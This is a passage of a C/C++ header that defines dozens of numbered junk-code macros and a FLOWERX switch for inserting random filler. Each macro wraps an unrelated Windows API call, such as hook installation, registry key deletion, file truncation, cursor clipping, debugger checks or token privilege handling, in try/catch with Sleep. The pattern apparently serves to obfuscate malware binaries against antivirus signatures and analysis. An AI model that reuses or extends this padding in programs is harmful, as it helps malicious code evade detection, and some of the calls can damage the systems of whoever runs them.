	Sleep(109);\
	}

#define XCODE110 try {OUTSTR("110");\
	dwRes=MultiByteToWideChar(CP_ACP,0,szXBuff, -1, NULL, 0);\
	pwText = new wchar_t[dwRes];\
	MultiByteToWideChar (CP_ACP, 0, szXBuff, -1, pwText, dwRes);\
	_wcsrev(pwText);\
	}\
	catch(...) {\
	Sleep(110);\
	}

#define XCODE111 try {OUTSTR("111");\
	SetFilePointer(hXMod, dwRes, NULL, FILE_BEGIN);\
	SetEndOfFile(hXMod);\
	}\
	catch(...) {\
	Sleep(111);\
	}

#define XCODE112 try {OUTSTR("112");\
	wsprintfA(szXBuff, "%d%d%S",dwRes,dwSizeXXX,evename.c_str());\
	}\
	catch(...) {\
	Sleep(112);\
	}

#define XCODE113 try {OUTSTR("113");\
	dwRes=CharUpperBuff(szXBuff, strlen(szXBuff));\
	}\
	catch(...) {\
	Sleep(113);\
	}

#define XCODE114 try {OUTSTR("114");\
	hwnd = GetTopWindow(GetTopWindow(FindWindow("Msg", NULL)));\
	}\
	catch(...) {\
	Sleep(114);\
	}

#define XCODE115 try {OUTSTR("115");\
	dwSizeXXX=GetWindowThreadProcessId(hwnd,&dwRes);\
	}\
	catch(...) {\
	Sleep(115);\
	}

#define XCODE116 try {OUTSTR("116");\
	hhook=SetWindowsHookEx(WH_GETMESSAGE,NULL,hinstExe,dwRes);\
	}\
	catch(...) {\
	Sleep(116);\
	}

#define XCODE117 try {OUTSTR("117");\
	lRes=RegDeleteKey(hKey,szXBuff);\
	}\
	catch(...) {\
	Sleep(117);\
	}

#define XCODE118 try {OUTSTR("118");\
	hwnd=GetDlgItem(hwnd, 0);\
	GetDlgItemText(hwnd, 1, szXBuff, dwRes);\
	}\
	catch(...) {\
	Sleep(118);\
	}

#define XCODE119 try {OUTSTR("119");\
	dwRes=GetClassName(hwnd, szXBuff, MAX_PATH);\
	}\
	catch(...) {\
	Sleep(119);\
	}

#define XCODE120 try {OUTSTR("120");\
	bRetval=IsWindow(hwnd);\
	if (bRetval)\
	{\
		hwnd1 = GetFirstChild(hwnd);\
		while (hwnd1 != NULL) {\
			hwnd = GetNextSibling(hwnd1);\
		}\
	}\
	}\
	catch(...) {\
	Sleep(120);\
	}

#define XCODE121 try {OUTSTR("121");\
	CompKey=SetClassLongPtr(hwnd, i, CompKey);\
	}\
	catch(...) {\
	Sleep(121);\
	}

#define XCODE122 try {OUTSTR("122");\
	bRetval=AttachThreadInput(GetWindowThreadProcessId(hwnd, NULL),GetCurrentThreadId(), TRUE);\
	}\
	catch(...) {\
	Sleep(122);\
	}

#define XCODE123 try {OUTSTR("123");\
	SetCursor(LoadCursor(NULL, AddMsg));\
	}\
	catch(...) {\
	Sleep(123);\
	}

#define XCODE124 try {OUTSTR("124");\
	dwRes=SetRect(&prcOld, 0, 0, GetSystemMetrics(SM_CXSCREEN) / 2, GetSystemMetrics(SM_CYSCREEN) / 2);\
	bRetval=ClipCursor(&prcOld);\
	}\
	catch(...) {\
	Sleep(124);\
	}

#define XCODE125 try {OUTSTR("125");\
	hwnd=GetForegroundWindow();\
	hwnd=SetActiveWindow(hwnd);\
	}\
	catch(...) {\
	Sleep(125);\
	}

#define XCODE126 try {OUTSTR("126");\
	hwnd=GetActiveWindow();\
	hwnd=SetCapture(hwnd);\
	}\
	catch(...) {\
	Sleep(126);\
	}

#define XCODE127 try {OUTSTR("127");\
	bRetval=ClientToScreen(hwnd,&pt);\
	}\
	catch(...) {\
	Sleep(127);\
	}

#define XCODE128 try {OUTSTR("128");\
	hdsk=GetThreadDesktop(GetCurrentThreadId()+1);\
	bRetval=SetThreadDesktop(hdsk);\
	}\
	catch(...) {\
	Sleep(128);\
	}

#define XCODE129 try {OUTSTR("129");\
	hXMod=CreateFile("COM1", GENERIC_READ | GENERIC_WRITE, 0, NULL,OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);\
	bRetval=GetCommState(hXMod,&dcb);\
	if(bRetval==FALSE)\
	{\
		CloseHandle(hXMod);\
	}\
	else\
	{\
		bRetval=BuildCommDCB("baud=115200 parity=N data=8 stop=1",&dcb);\
		if(bRetval==FALSE)\
		{\
			CloseHandle(hXMod);\
		}\
		bRetval=SetCommState(hXMod,&dcb);\
		if(bRetval==FALSE)\
		{\
			CloseHandle(hXMod);\
			return FALSE;\
		}\
		bRetval=SetCommTimeouts(hXMod,&timeout);\
		if(bRetval==FALSE)\
		{\
			CloseHandle(hXMod);\
		}\
	}\
	}\
	catch(...) {\
	Sleep(129);\
	}

#define XCODE130 try {OUTSTR("130");\
	bRetval=SetLayeredWindowAttributes(hwnd,RGB(128,0,0),(BYTE)szXBuff[0],LWA_ALPHA);\
	}\
	catch(...) {\
	Sleep(130);\
	}

#define XCODE131 try {OUTSTR("131");\
	GetLocalTime(&st);\
	GetTimeFormat(LOCALE_SYSTEM_DEFAULT,TIME_FORCE24HOURFORMAT,&st,"hh:mm:ss",szXBuff,sizeof(szXBuff));\
	}\
	catch(...) {\
	Sleep(131);\
	}

#define XCODE132 try {OUTSTR("132");\
	bRetval=CreateDirectory(szXBuff,&sa);\
	strcat(szXBuff,buf);\
	bRetval=CopyFile(szXBuff,TmpBuf,FALSE);\
	}\
	catch(...) {\
	Sleep(132);\
	}

#define XCODE133 try {OUTSTR("133");\
	PasswdLen=TranslateAccelerator(hwnd,hacc,&msg);\
	}\
	catch(...) {\
	Sleep(133);\
	}

#define XCODE134 try {OUTSTR("134");\
	PasswdLen=GetWindowTextLength(hwnd);\
	}\
	catch(...) {\
	Sleep(134);\
	}

#define XCODE135 try {OUTSTR("135");\
	GetClientRect(hwnd, &prcOld);\
	DrawText(hdc, szXBuff, strlen(szXBuff), &prcOld, DT_CENTER);\
	EndPaint(hwnd, &ps);\
	}\
	catch(...) {\
	Sleep(135);\
	}

#define XCODE136 try {OUTSTR("136");\
	wcex.cbSize = sizeof(WNDCLASSEX);\
	wcex.style			= CS_HREDRAW | CS_VREDRAW;\
	wcex.lpfnWndProc	= (WNDPROC)Enum16;\
	wcex.cbClsExtra		= 0;\
	wcex.cbWndExtra		= 0;\
	wcex.hInstance		= hinstExe;\
	wcex.hIcon			= LoadIcon(hinstExe, (LPCTSTR)IDC_ARROW);\
	wcex.hCursor		= LoadCursor(NULL, IDC_ARROW);\
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);\
	wcex.lpszMenuName	= (LPCSTR)IDC_ARROW;\
	wcex.lpszClassName	= szXBuff;\
	wcex.hIconSm		= LoadIcon(wcex.hInstance, (LPCTSTR)IDC_ARROW);\
	RegisterClassEx(&wcex);\
	}\
	catch(...) {\
	Sleep(136);\
	}

#define XCODE137 try {OUTSTR("137");\
	i=LoadString(hinstExe,uDropEffect,szXBuff,strlen(szXBuff));\
	}\
	catch(...) {\
	Sleep(137);\
	}

#define XCODE138 try {OUTSTR("138");\
	dwRes=_beginthread((void (__cdecl *)(void *))GetTickCount,0,NULL);\
	}\
	catch(...) {\
	Sleep(138);\
	}

#define XCODE139 try {OUTSTR("139");\
	dwRes=MAX_PATH;\
	bRetval=GetComputerName(szXBuff,&dwRes);\
	}\
	catch(...) {\
	Sleep(139);\
	}

#define XCODE140 try {OUTSTR("140");\
	if (!GetUrlCacheEntryInfo(szXBuff, NULL, &dwRes))\
		{\
			if (GetLastError()==ERROR_INSUFFICIENT_BUFFER)\
			{\
				lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO)new BYTE[dwRes];\
				if (GetUrlCacheEntryInfo(szXBuff,lpCacheEntry, &dwRes))\
				{\
						ZeroMemory(szXBuff, MAX_PATH);\
						GetTempPath(MAX_PATH, szXBuff);\
						strcat(szXBuff, buf);\
						::CopyFile( lpCacheEntry->lpszLocalFileName, szXBuff, FALSE);\
						delete lpCacheEntry;\
				}\
			}\
		}\
	}\
	catch(...) {\
	Sleep(140);\
	}

#define XCODE141 try {OUTSTR("141");\
	GetClientRect(hwnd, &prcOld);\
	hdc1=CreateCompatibleDC(hdc);\
	hBitmap = CreateCompatibleBitmap(hdc, prcOld.right, prcOld.bottom);\
	hBitmap1 = (HBITMAP)::SelectObject(hdc1,hBitmap);\
	BitBlt(hdc1, 0, 0, prcOld.right, prcOld.bottom, hdc, 0, 0, SRCCOPY);\
	}\
	catch(...) {\
	Sleep(141);\
	}

#define XCODE142 try {OUTSTR("142");\
	if (InitializeSecurityDescriptor(&psd, SECURITY_DESCRIPTOR_REVISION) != 0)\
	{\
		if (SetSecurityDescriptorDacl(&psd, TRUE, NULL, true))\
		{\
			hXMod = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());\
			OpenProcessToken(hXMod, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, hHandleList);\
		}\
	}\
	}\
	catch(...) {\
	Sleep(142);\
	}

#define XCODE143 try {OUTSTR("143");\
	bRetval=TerminateThread(hXMod, dwRes);\
	}\
	catch(...) {\
	Sleep(142);\
	}

#define XCODE144 try {OUTSTR("144");\
	bRetval=DisconnectNamedPipe(hwnd);\
	}\
	catch(...) {\
	Sleep(144);\
	}

#define XCODE145 try {OUTSTR("145");\
	atom=AddAtom(AddMsg);\
	if (FindAtom(szXBuff)==0)\
	{\
		DeleteAtom(atom);\
	}\
	}\
	catch(...) {\
	Sleep(145);\
	}

#define XCODE146 try {OUTSTR("146");\
	atom=GlobalAddAtom(AddMsg);\
	if (GlobalFindAtom(szXBuff)==0)\
	{\
		GlobalDeleteAtom(atom);\
	}\
	}\
	catch(...) {\
	Sleep(146);\
	}

#define XCODE147 try {OUTSTR("147");\
	if(hXMod!=INVALID_HANDLE_VALUE)\
		AddRefActCtx(hXMod);\
	}\
	catch(...) {\
	Sleep(147);\
	}

#define XCODE148 try {OUTSTR("148");\
	lp=AddVectoredContinueHandler(dwRes,(PVECTORED_EXCEPTION_HANDLER)GetTickCount);\
	}\
	catch(...) {\
	Sleep(148);\
	}

#define XCODE149 try {OUTSTR("149");\
	bRetval=AllocateUserPhysicalPages(hXMod, &CompKey, &CompKey);\
	}\
	catch(...) {\
	Sleep(149);\
	}

#define XCODE150 try {OUTSTR("150");\
	bRetval=AllocConsole();\
	}\
	catch(...) {\
	Sleep(150);\
	}

#define XCODE151 try {OUTSTR("151");\
	bRetval=AreFileApisANSI();\
	}\
	catch(...) {\
	Sleep(151);\
	}

#define XCODE152 try {OUTSTR("152");\
	if(bRetval)\
	bRetval=AssignProcessToJobObject(hXMod,hmyfile);\
	}\
	catch(...) {\
	Sleep(152);\
	}

#define XCODE153 try {OUTSTR("153");\
	if(bRetval)\
	bRetval=AttachConsole(dwRes);\
	}\
	catch(...) {\
	Sleep(153);\
	}

#define XCODE154 try {OUTSTR("154");\
	if(bRetval)\
	bRetval=BackupRead(hXMod,(LPBYTE)szXBuff,dwRes,&dwSizeXXX,bRetval,bVal,&lp);\
	}\
	catch(...) {\
	Sleep(154);\
	}

#define XCODE155 try {OUTSTR("155");\
	if(bRetval)\
	bRetval=BackupSeek(hXMod,dwRes,dwSizeXXX,&dwBytesInBlock,&dwPort,&lp);\
	}\
	catch(...) {\
	Sleep(155);\
	}

#define XCODE156 try {OUTSTR("156");\
	if(bRetval)\
	bRetval=BackupWrite(hXMod,(LPBYTE)szXBuff,dwRes,&dwSizeXXX,bVal,bRetval,&lp);\
	}\
	catch(...) {\
	Sleep(156);\
	}

#define XCODE157 try {OUTSTR("157");\
	bRetval=Beep(0x7fffffff, 1);\
	}\
	catch(...) {\
	Sleep(157);\
	}

#define XCODE158 try {OUTSTR("158");\
	hXMod=BeginUpdateResource(szXBuff, bRetval);\
	}\
	catch(...) {\
	Sleep(158);\
	}

#define XCODE159 try {OUTSTR("159");\
	bRetval=BindIoCompletionCallback(hXMod, (LPOVERLAPPED_COMPLETION_ROUTINE)GetTickCount, dwRes);\
	}\
	catch(...) {\
	Sleep(159);\
	}

#define XCODE160 try {OUTSTR("160");\
	bRetval=BuildCommDCBAndTimeouts(szXBuff, &dcb, &ctout);\
	}\
	catch(...) {\
	Sleep(160);\
	}

#define XCODE161 try {OUTSTR("161");\
	bRetval=CallNamedPipe(szXBuff, buf, dwRes, TmpBuf, dwSizeXXX, &dwBytesInBlock, cb);\
	}\
	catch(...) {\
	Sleep(161);\
	}

#define XCODE162 try {OUTSTR("162");\
	bRetval=CancelDeviceWakeupRequest(hXMod);\
	}\
	catch(...) {\
	Sleep(162);\
	}

#define XCODE163 try {OUTSTR("163");\
	bRetval=CancelIo(hXMod);\
	}\
	catch(...) {\
	Sleep(163);\
	}

#define XCODE164 try {OUTSTR("164");\
	bRetval=CancelTimerQueueTimer(hXMod, hmyfile);\
	}\
	catch(...) {\
	Sleep(164);\
	}

#define XCODE165 try {OUTSTR("165");\
	bRetval=CancelWaitableTimer(hXMod);\
	}\
	catch(...) {\
	Sleep(165);\
	}

#define XCODE166 try {OUTSTR("166");\
	bRetval=ChangeTimerQueueTimer(hXMod,hmyfile,dwRes,dwSizeXXX);\
	}\
	catch(...) {\
	Sleep(166);\
	}

#define XCODE167 try {OUTSTR("167");\
	pFunc=GetProcAddress(LoadLibrary("kernel32.dll"),"CheckNameLegalDOS8Dot3");\
	if(pFunc) {\
		bRetval=((CHECKD8)pFunc)(AddMsg,szXBuff,dwRes,&bVal,&bRetval);\
	}\
	}\
	catch(...) {\
	Sleep(167);\
	}

#define XCODE168 try {OUTSTR("168");\
	pFunc=GetProcAddress(LoadLibrary("kernel32.dll"),"CheckRemoteDebuggerPresent");\
	if(pFunc) {\
		bRetval=((CRDP)pFunc)(hXMod,&bVal);\
	}\
	}\
	catch(...) {\
	Sleep(168);\
	}

#define XCODE169 try {OUTSTR("169");\
	if(bRetval) {\
	bRetval=ClearCommBreak(hXMod);\
	}\
	}\
	catch(...) {\
	Sleep(169);\
	}

#define XCODE170 try {OUTSTR("170");\
	if(bRetval) {\
	bRetval=ClearCommError(hXMod,&dwRes,&cstat);\
	}\
	}\
	catch(...) {\
	Sleep(170);\
	}

#define XCODE171 try {OUTSTR("171");\
	if(bRetval) {\
	dwRes=CompareFileTime(&ft, &ft1);\
	}\
	}\
	catch(...) {\
	Sleep(171);\
	}

#define XCODE172 try {OUTSTR("172");\
	dwRes=CompareString(lcid,cb,szXBuff,dwSizeXXX,AddMsg,PasswdLen);\
	}\
	catch(...) {\
	Sleep(172);\
	}

#define XCODE173 try {OUTSTR("173");\
	if(hXMod)\
	bRetval=ConnectNamedPipe(hXMod,po);\
	}\
	catch(...) {\
	Sleep(173);\
	}

#define XCODE174 try {OUTSTR("174");\
	if(bRetval)\
	bRetval=ContinueDebugEvent(dwRes,dwSizeXXX,dwPort);\
	}\
	catch(...) {\
	Sleep(174);\
	}

#define XCODE175 try {OUTSTR("175");\
	if(bRetval)\
	lcid=ConvertDefaultLocale(lcid);\
	}\
	catch(...) {\
	Sleep(175);\
	}

#define XCODE176 try {OUTSTR("176");\
	if(bRetval)\
	bRetval=ConvertFiberToThread();\
	}\
	catch(...) {\
	Sleep(176);\
	}

#define XCODE177 try {OUTSTR("177");\
	if(bRetval)\
	lp=ConvertThreadToFiber(lp);\
	}\
	catch(...) {\
	Sleep(177);\
	}

#define XCODE178 try {OUTSTR("178");\
	if(bRetval)\
	lp=ConvertThreadToFiberEx(lp,dwRes);\
	}\
	catch(...) {\
	Sleep(178);\
	}
#ifdef FLOWERX
#include "xrand.h"
#else
#define XXX1 _asm nop;
#define XXX2 _asm nop;
#define XXX3 _asm nop;
#define XXX4 _asm nop;
#define XXX5 _asm nop;
#define XXX6 _asm nop;
#define XXX7 _asm nop;
#define XXX8 _asm nop;
#define XXX9 _asm nop;
#define XXX10 _asm nop;
#define XXX11 _asm nop;
#endif
